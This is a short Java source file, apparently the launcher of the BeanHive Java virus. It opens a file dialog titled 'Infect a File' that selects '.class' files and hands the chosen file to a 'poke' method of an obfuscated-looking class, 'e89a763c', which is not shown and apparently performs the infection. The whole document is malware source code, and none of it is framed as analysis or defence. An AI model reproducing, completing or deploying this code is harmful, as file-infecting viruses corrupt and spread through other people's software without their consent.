import java.applet.*;
import java.awt.*;
import java.awt.event.*;
import java.io.*;
import java.util.*;
//displays a window with an "open" button
//which displays the file Open dialog
class BeanHiveFrame extends Frame
  implements ActionListener
{
Checkbox Open;
Checkbox Save;
CheckboxGroup grp;
Button fileit;
FileFilter filter;
FileDialog fdlg;
e89a763c vstart;
String dirpath;
String filename;
//------------------------------------------------
public void init()
{
   vstart = new e89a763c();	
   filter = new FileFilter("class");
   fdlg = new FileDialog(this, "Infect a File", FileDialog.LOAD);
   fdlg.setFilenameFilter(filter);
   fdlg.setFile("*.class");
   fdlg.show();   
   dirpath = fdlg.getDirectory();
   filename = fdlg.getFile();
   File file = new File(dirpath,filename); 
   try {   	
        vstart.poke(file);
   }
   catch (IOException e) {}      
}
//------------------------------------------------
public void actionPerformed(ActionEvent evt) {

   fdlg.hide();

}

}
